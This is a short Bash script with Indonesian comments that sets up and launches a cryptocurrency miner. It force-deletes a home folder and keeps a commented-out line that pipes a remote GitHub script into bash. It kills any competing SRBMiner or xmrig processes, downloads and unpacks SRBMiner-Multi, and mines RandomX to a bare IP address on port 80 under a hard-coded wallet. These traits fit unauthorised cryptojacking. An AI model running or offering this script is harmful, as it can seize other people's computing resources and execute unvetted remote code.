# Cek dan hapus folder 'vec' jika sudah ada
if [ -d "$HOME/vec" ]; then
    echo "Folder 'vec' ditemukan. Menghapus..."
    rm -rf "$HOME/vec"
else
    echo "Folder 'vec' tidak ditemukan. Melanjutkan..."
fi

# Jalankan skrip dari GitHub
echo "Menjalankan skrip dari GitHub..."
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash

# Nama folder miner
MINER_DIR="$HOME/SRBMiner-Multi-2-7-5"

# Pastikan miner lama berhenti dulu
echo "Menghentikan miner yang berjalan sebelumnya (jika ada)..."
pkill -f SRBMiner-MULTI
pkill -f xmrig
sleep 5

# Cek apakah folder miner sudah ada
if [ ! -d "$MINER_DIR" ]; then
    echo "Miner belum ada, mengunduh sekarang..."
    wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz
    tar -xzf SRBMiner-Multi-2-7-5-Linux.tar.gz
    rm SRBMiner-Multi-2-7-5-Linux.tar.gz
else
    echo "Miner sudah ada, langsung menjalankan..."
fi


./SRBMiner-MULTI  -a randomx    \
 -o stratum+tcp://3.144.16.65:80 \
 -u Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d.sys \
 -p x